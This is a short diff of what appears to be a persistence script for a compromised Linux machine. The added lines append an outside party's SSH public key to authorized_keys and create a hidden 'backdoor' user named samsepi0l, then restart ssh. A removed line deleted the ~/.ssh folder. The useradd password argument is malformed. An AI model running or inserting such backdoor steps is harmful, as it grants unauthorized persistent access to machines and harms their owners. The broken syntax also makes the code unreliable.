@@ -1,7 +1,7 @@
-echo "removing ssh config folder..."
-rm -r ~/.ssh
+echo "adding public key to authorized folder"
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBdyjOTdBeULcwJB2BUtqSIgtxQ2FhvPOikq7aVDWFVqyoxSh7+dAP2jVgWApmsFNRyUcaxAAtiwcJ1IwcU+UXeYoCAfgHNrkL4KQ4QJB6R+DkiqwkakwC15jROuncXnNNE9a9p164yvb+yNdORnFMSIOLfKQgapdgnYv+jhis0azxu+jzDZFbf6FN73QgDjGuXfCB2JpkNCxXaVIwn75O4jicEhCFOOorUzrvBbokOOPFXOxJWl9j4fPrnezK1s79Cr7mR59qtZIqXf0Xv5+mBnPSmEhwAi7XfSLc36qvcB+KH+InVOUzI2YOr04hArZXEueZBpZVrb99g6iCpAGga4xQ0F61LT0CL7pFWwYopjoSoOeJtPM6bahhKOuP2S8q1+GseaqPo+W2qR5vh6D9JvPqxrtYeBhE9v94LpKYXw4cNBvRybzU35BFmntkddgcZyBPTYLwvewgfuG70M3qMB7BdonM7gLJ0hI+4bwK41T1rMzl1Dv51/XhZdJgJr0= stealth@Nighthawk" >> .ssh/authorized_keys
 echo "creating backdoor usr..."
-useradd -M samsepi0l
+useradd -M 'password' samsepi0l 
 echo "restarting ssh service..."
-systemctl restart ssh
+service ssh restart
 echo "HOPEFULLY COMPLETE"
